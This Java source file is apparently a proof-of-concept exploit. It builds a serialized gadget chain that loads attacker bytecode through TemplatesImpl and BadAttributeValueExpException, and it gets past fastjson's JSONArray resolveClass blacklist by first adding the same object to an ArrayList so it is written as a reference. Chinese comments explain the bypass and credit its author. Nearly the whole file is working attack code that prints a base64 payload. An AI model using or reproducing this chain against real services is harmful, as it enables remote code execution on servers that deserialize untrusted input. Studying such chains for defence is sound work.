import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;

/**
 *    Y4tacker原生反序列化2
 *    向List、set、map类型中添加同样对象，都可以作为引用类型绕过resolveClass
 *
 */




public class bad_gadget {
    public static void main(String[] args) throws Exception {
        ArrayList<Object> list = new ArrayList<>();
        TemplatesImpl templatesimpl = new TemplatesImpl();

        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));

        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());
        
        //为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测
        list.add(templatesimpl);

        JSONArray jo = new JSONArray();
        //此时在hash表中查到了映射，因此接下来以引用形式输出
        jo.add(templatesimpl);

        BadAttributeValueExpException exp = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jo);
        // 第二次添加
        list.add(exp);

//        也可以使用Map
//        HashMap hashMap = new HashMap();
//        hashMap.put(templates,bd);

        
        System.out.println(serial(list));
    }

    public static String serial(Object o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
